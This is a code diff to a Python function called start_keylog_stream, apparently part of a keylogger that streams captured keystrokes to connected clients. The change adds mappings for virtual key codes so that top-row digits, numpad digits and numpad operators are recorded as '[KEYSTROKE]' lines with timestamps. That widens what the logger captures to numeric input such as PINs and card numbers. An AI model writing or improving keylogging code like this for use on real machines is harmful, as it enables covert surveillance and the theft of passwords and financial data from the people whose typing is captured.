@@ -494,6 +494,23 @@ def start_keylog_stream():
                 k = key.char
             except AttributeError:
                 k = None
+
+            if k is None:
+                try:
+                    if hasattr(key, 'vk') and key.vk is not None:
+                        vk_mapping = {
+                            # Standard numbers (top row)
+                            48: "0", 49: "1", 50: "2", 51: "3", 52: "4", 53: "5", 54: "6", 55: "7", 56: "8", 57: "9",
+                            # Numpad numbers
+                            96: "0", 97: "1", 98: "2", 99: "3", 100: "4", 101: "5", 102: "6", 103: "7", 104: "8", 105: "9",
+                            # Numpad operators
+                            106: "*", 107: "+", 109: "-", 110: ".", 111: "/"
+                        }
+                        if key.vk in vk_mapping:
+                            k = vk_mapping[key.vk]
+                except Exception:
+                    pass
+
             if k is not None:
                 line = f"[KEYSTROKE] {ts} {k}"
             else:
@@ -501,7 +518,20 @@ def start_keylog_stream():
                 if s.startswith("Key."):
                     line = f"[KEYSTROKE] {ts} <{s.replace('Key.', '').upper()}>"
                 elif s.startswith("<") and s.endswith(">"):
-                    line = f"[KEYSTROKE] {ts} {s}"
+                    val = s.strip("<>")
+                    if val.isdigit():
+                        vk_val = int(val)
+                        vk_mapping = {
+                            48: "0", 49: "1", 50: "2", 51: "3", 52: "4", 53: "5", 54: "6", 55: "7", 56: "8", 57: "9",
+                            96: "0", 97: "1", 98: "2", 99: "3", 100: "4", 101: "5", 102: "6", 103: "7", 104: "8", 105: "9",
+                            106: "*", 107: "+", 109: "-", 110: ".", 111: "/"
+                        }
+                        if vk_val in vk_mapping:
+                            line = f"[KEYSTROKE] {ts} {vk_mapping[vk_val]}"
+                        else:
+                            line = f"[KEYSTROKE] {ts} {s}"
+                    else:
+                        line = f"[KEYSTROKE] {ts} {s}"
                 else:
                     line = f"[KEYSTROKE] {ts} <{s.upper()}>"
             with client_lock:
